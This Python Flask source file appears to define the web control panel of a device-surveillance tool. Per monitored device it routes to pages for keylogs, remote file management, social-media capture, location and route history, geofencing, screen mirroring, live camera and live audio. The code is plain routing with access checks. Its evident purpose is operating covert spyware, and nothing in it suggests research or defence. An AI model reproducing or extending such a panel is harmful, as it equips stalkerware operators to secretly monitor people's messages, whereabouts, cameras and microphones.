import os
from flask import Blueprint, request, redirect, render_template, session, send_file, current_app
from core.auth import login_required, admin_required, has_device_access

views_bp = Blueprint('views', __name__)

@views_bp.route('/', endpoint='index')
def index():
    if 'username' in session:
        if session.get('admin_logged', False):
            return redirect('/admin')
        return redirect('/dashboard')
    return redirect('/login')

@views_bp.route('/introl', endpoint='introl_view')
@login_required
def introl_view():
    return render_template('introl.html')

@views_bp.route('/introl.mp4')
@views_bp.route('/static/intro/introl.mp4')
def serve_intro_video():
    return send_file(os.path.join(current_app.root_path, 'static', 'intro', 'introl.mp4'))

@views_bp.route('/logo.png')
@views_bp.route('/static/logo.png')
@views_bp.route('/static/logo/logo.png')
def serve_logo():
    return send_file(os.path.join(current_app.root_path, 'static', 'logo', 'logo.png'))

@views_bp.route('/logo1.png')
@views_bp.route('/static/logo1.png')
@views_bp.route('/static/logo/logo1.png')
def serve_logo1():
    return send_file(os.path.join(current_app.root_path, 'static', 'logo', 'logo1.png'))

@views_bp.route('/dashboard', endpoint='dashboard_view')
@login_required
def dashboard_view():
    if session.get('admin_logged', False):
        return redirect('/admin')
    return render_template('dashbord.html')

@views_bp.route('/keylogs', endpoint='keylogs_view')
@login_required
def keylogs_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('keylogs.html')

@views_bp.route('/file_manager', endpoint='file_manager_view')
@login_required
def file_manager_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('file_manager.html')

@views_bp.route('/social_media', endpoint='social_media_view')
@login_required
def social_media_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('social_media.html')

@views_bp.route('/location_3d', endpoint='location_3d_view')
@login_required
def location_3d_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('location.html')

@views_bp.route('/route_history', endpoint='route_history_view')
@login_required
def route_history_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('route_history.html')

@views_bp.route('/geofencing', endpoint='geofencing_view')
@login_required
def geofencing_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('geofencing.html')

@views_bp.route('/ai_chatbot', endpoint='ai_chatbot_view')
@login_required
def ai_chatbot_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('Ai_chatbot.html')

@views_bp.route('/Screen_mirroring.html', endpoint='mirror_view')
@login_required
def mirror_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('Screen_mirroring.html')

@views_bp.route('/Live_Camera.html', endpoint='live_camera_view')
@login_required
def live_camera_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('Live_Camera.html')

@views_bp.route('/Live_Audio.html', endpoint='live_audio_view')
@login_required
def live_audio_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('Live_Audio.html')

@views_bp.route('/admin', endpoint='admin_panel_view')
@admin_required
def admin_panel_view():
    return render_template('admin.html')
